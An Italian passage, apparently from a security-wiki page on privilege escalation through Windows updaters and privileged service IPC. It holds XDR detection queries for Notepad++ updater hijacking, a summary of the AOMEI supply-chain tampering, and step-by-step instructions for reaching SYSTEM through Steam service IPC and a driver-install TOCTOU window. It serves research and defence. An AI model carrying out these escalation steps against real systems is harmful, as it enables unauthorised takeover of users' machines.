| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un programma di installazione non di Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Questi pattern si applicano a qualsiasi updater che accetti manifest non firmati o non verifichi in modo rigoroso i firmatari degli installer: dirottamento della rete + installer malevolo + sideloading firmato con un certificato BYO consentono l'esecuzione di codice remoto sotto la parvenza di aggiornamenti «attendibili».

### La configurazione delle notifiche come secondo trigger di aggiornamento

Un updater può usare configurazioni remote separate per **preparare contenuti e avviarne l'esecuzione**. Ciò richiede il controllo delle configurazioni o delle relative risposte; i report non indicano come sia stato ottenuto l'accesso all'origine. Nel caso di AOMEI, `down_html.ini` selezionava un URL di archivio, una versione (`thrid`) e un MD5 (`Val`); l'attaccante ha incrementato la versione e modificato insieme l'URL e il checksum corrispondente. Questo è il [problema relativo al confine di fiducia dei metadati](#2-hijacking-the-update-channel-to-run-code-as-system) descritto sopra. Il percorso di esecuzione aggiuntivo era `Notifycfg.ini`: indicava ad `ABNotify.exe` di caricare un `upgrade-now.html` estratto tramite un URL locale `file:///` in una WebView. La pagina passava automaticamente a un eseguibile nella stessa directory, che la WebView affidava alla shell di sistema. Il processo figlio ereditava i privilegi del notifier; questo non lo elevava automaticamente a SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google ha inoltre segnalato un `Notifycfg.ini` manomesso contenente oltre 35.000 sezioni fittizie ripetute, che aggiravano il normale controllo della versione del client. Il report non dimostra un bypass generale del parser. L'attaccante ripristinava i file remoti dopo intervalli di cinque-dieci minuti, quindi solo i client che eseguivano il polling durante tali intervalli ricevevano la configurazione modificata. Questo canale di notifica veicolava anche un'esca distinta di [coercizione WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), che non richiedeva l'esecuzione dell'archivio.<sup>[[18]](#references)</sup>

---
## Bootstrap tramite memoria condivisa verso IPC di un servizio privilegiato

Non fermarti all'enumerazione delle named pipe. Un broker SYSTEM può esporre una **file mapping** permissiva per configurare la connessione, quindi duplicare handle di pipe anonime nel processo richiedente. Nell'implementazione Steam testata, `Global\SteamClientService_SharedMemFile` e `Global\SteamClientService_SharedMemLock` coordinano l'handshake tra PID del client ed evento; il servizio restituisce due handle di pipe e le successive richieste con lunghezza prefissata usano `RunInterface` (`0x01`). La DACL della mapping consentiva l'accesso ai client di qualsiasi livello di integrità. L'oggetto interno `CSteamServiceWin32` in `steamclient64.dll` forniva un client pratico: risolvi la variabile globale specifica della build, chiama lo slot 0 della vtable `Connect`, quindi usa le mappe delle interfacce invece di reimplementare l'handshake. Raggiungere IPC è solo un prerequisito; la decisione di fiducia dell'handler privilegiato determina se si verifica un'escalation. <sup>[[19]](#references)[[20]](#references)</sup>

### Un manifest firmato si espande in una allowlist obsoleta di eseguibili

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) verifica `kvsignatures` di un VDF firmato, ma registra il **percorso espanso dell'eseguibile**, non un'identità immutabile del file. Con una voce firmata `Run Process` come `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, specifica un `%INSTALLDIR%` scrivibile dall'utente. Inserisci un eseguibile sostitutivo esattamente in quel percorso espanso, quindi chiama `RunInstallScript` (slot 22) con un VDF non firmato il cui `Process 1` indica il percorso consentito. La voce rimane valida finché il servizio non viene riavviato; nell'implementazione segnalata non viene riverificato il file prima dell'avvio come SYSTEM. Fai corrispondere il nome del file inserito alla voce firmata effettiva, non solo alla categoria del prerequisito. <sup>[[19]](#references)[[20]](#references)</sup>

### Il processo figlio del module manager aggira il controllo della firma del caricamento diretto

`IClientModuleManager::LoadModule` (slot 0) accetta i byte del modulo se l'ID fornito corrisponde al loro CRC32. `CallFunctionAsync` (slot 3), con `flags & 8`, seleziona il ramo del **processo figlio**, anziché il ramo di caricamento riflessivo diretto che verifica una firma Valve. Il servizio scrive `legacycompat\servicecall_<CRC>.dll` e avvia `legacycompat\steamservice.exe /runfunc ...` dalla directory di installazione. Se quella directory è scrivibile dall'utente, inserisci un eseguibile nel percorso indicato, carica un modulo usa e getta con CRC corrispondente e chiama il metodo asincrono con il bit 3 impostato. Nella build segnalata, né l'eseguibile figlio né la DLL scritta su disco venivano autenticati. Il modulo non deve essere un payload funzionante: ciò che viene eseguito come SYSTEM è l'eseguibile figlio sostituito. <sup>[[19]](#references)[[20]](#references)</sup>

### Controlli dei membri del catalogo prima dell'installazione privilegiata di un driver

Per un broker di installazione driver, verifica se la convalida del catalogo è vincolata **all'esatto INF passato all'installer**. Nel percorso segnalato `InstallVrLinkDongleDriver`, `WinVerifyTrust` convalida un catalogo e `CryptCATAdminCalcHashFromFileHandle` cerca *almeno un* file corrispondente in una directory fornita dal chiamante, ma il servizio esegue poi `pnputil /add-driver ... /install` su `netrtwlanuval.inf` senza verificare che tale INF sia il membro previsto del catalogo. È accettata una directory piatta o specifica per l'architettura. Un catalogo firmato con qualsiasi file corrispondente nella directory può quindi superare il controllo debole del servizio, anche se l'INF passato all'installer privilegiato è diverso. Non dare per scontato che questo, da solo, aggiri le policy di firma dei driver di Windows: l'installazione riuscita dipende comunque dal pacchetto sostitutivo e dalle policy dell'host. <sup>[[19]](#references)[[20]](#references)</sup>

Il servizio rilascia gli handle di convalida prima che `pnputil` apra l'INF, lasciando una [finestra TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) con un sink di installazione driver anziché un aggiornamento di eseguibile. Un oplock può sincronizzare la sostituzione tra il controllo e l'apertura da parte dell'installer. Lo stesso IPC espone l'[inoltro dell'input del desktop protetto](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring), soggetto a prerequisiti di consenso separati. <sup>[[19]](#references)</sup>

## References
- [1] [Avviso – Netskope Client per Windows – Escalation dei privilegi locale tramite server rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avviso di sicurezza Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC per Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Compromettere ASUS DriverHub, MSI Center, Acer Control Centre e Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalation dei privilegi locale tramite file scrivibili in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalation dei privilegi nell'agente Windows](https://checkmk.com/werk/16361)
- [10] [PoC di sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer di CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Attori sponsorizzati da stati sfruttano la supply chain di Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aggiornamento sull'incidente di dirottamento dell'infrastruttura](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Aggirare la correzione per CVE-2025-0309 in Netskope Client per Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Individuazione di bug di escalation dei privilegi in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: da gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Compromissione della supply chain di AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group e Mandiant – Indagine sulla manomissione temporanea della supply chain](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Voltare Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [PoC di Atredis – Voltare Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
